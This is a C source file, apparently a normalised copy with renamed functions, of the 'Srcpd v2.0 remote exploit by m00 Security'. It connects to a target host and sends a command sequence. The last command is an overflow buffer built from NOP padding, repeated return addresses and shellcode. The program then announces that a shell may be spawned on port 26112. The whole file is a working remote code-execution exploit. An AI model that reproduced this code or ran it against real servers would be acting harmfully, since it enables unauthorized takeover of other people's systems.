#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {long ret; int rep; } ;

/* Variables and functions */
 int EOF ; 
 int /*<<< orphan*/  NOP ; 
 long RET ; 
 int SCODELEN ; 
 int FUNC0 (char*) ; 
 long FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int FUNC5 (int,char**,char*) ; 
 int FUNC6 (char*,int) ; 
 scalar_t__ FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int FUNC12 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* scode ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int,int /*<<< orphan*/ ) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 

int FUNC15(int argc, char* argv[])
{	
	char* host,*buf,*rcvbuf;
	long  ret = RET/*get_esp()*/,*addr;
	int   rez,port=12340,sock,pos,i,trgt;

	if (argc < 4) FUNC14(argv[0]);
	
	while ((rez = FUNC5(argc,argv,"h:p:o:t:")) != -1)
		switch (rez)
		{
			case 'h': host = optarg;       break;
			case 'p': port = FUNC0(optarg); break;
			case 'o': ret -= FUNC1(optarg); break;
			case 't': trgt = FUNC0(optarg); break;				
			case '?': break;
		}
	FUNC11(" ** ***************************************** **\n"); 		
	FUNC11(" ** Srcpd v2.0 remote exploit by m00 Security **\n");
	FUNC11(" ** ***************************************** **\n");
	FUNC11(" Conneting...");
	if ((sock = FUNC6(host,port)) <= 0)
	{
		FUNC10(" connect()");
		FUNC3(-1);		
	}
	ret = targets[trgt].ret;
	FUNC11("OK\n using RET = 0x%x\n",ret);	
	buf    = (char*)FUNC7(220);
	rcvbuf = (char*)FUNC7(512);	
	pos = FUNC12(sock,rcvbuf,512,0);	    
	FUNC11(" Sending...");
	if (pos <= 0 || pos == EOF) return -1;	
	FUNC13(sock,"go 11111\r\n",10,0);	
	pos = FUNC12(sock,rcvbuf,512,0);	    
	if (pos <= 0 || pos == EOF) return -1;
	FUNC9(buf,NOP,200);
	FUNC8(buf,"set 1 lock ",11);
	addr = (long*)(buf+11);
	for (i =0; i< targets[trgt].rep; i++)
		*(addr++) = ret;
	*(addr++) = '\x20';	
	FUNC8(buf+targets[trgt].rep*4+12,scode,SCODELEN);
	buf[219] = '\0';
	FUNC11("OK\n");	
	FUNC13(sock,buf,220,0);
	FUNC11(" now, if you was lucky with ret, shell spawned on 26112.\n");
	FUNC4(buf);
	FUNC4(rcvbuf);
	FUNC2(sock);
	return 0; 
 }